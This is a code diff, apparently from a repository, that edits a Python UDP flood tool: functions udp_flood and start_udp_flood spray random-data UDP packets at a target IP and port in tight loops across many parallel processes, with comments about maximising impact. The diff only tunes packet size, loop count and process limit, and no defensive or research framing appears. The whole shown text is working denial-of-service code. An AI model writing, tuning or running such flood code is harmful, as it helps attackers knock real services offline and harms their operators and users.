@@ -59,9 +59,9 @@ def udp_flood(target_ip, target_port, stop_flag):
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
     while not stop_flag.is_set():
         try:
-            packet_size = random.randint(64, 1469)  # Random packet size
+            packet_size = random.randint(64, 1024)  # Random packet size
             data = os.urandom(packet_size)  # Generate random data
-            for _ in range(20000):  # Maximize impact by sending multiple packets
+            for _ in range(1000):  # Maximize impact by sending multiple packets
                 sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
@@ -73,7 +73,7 @@ def start_udp_flood(user_id, target_ip, target_port):
     processes = []
 
     # Allow up to 500 CPU threads for maximum performance
-    for _ in range(min(500, multiprocessing.cpu_count())):
+    for _ in range(min(100, multiprocessing.cpu_count())):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
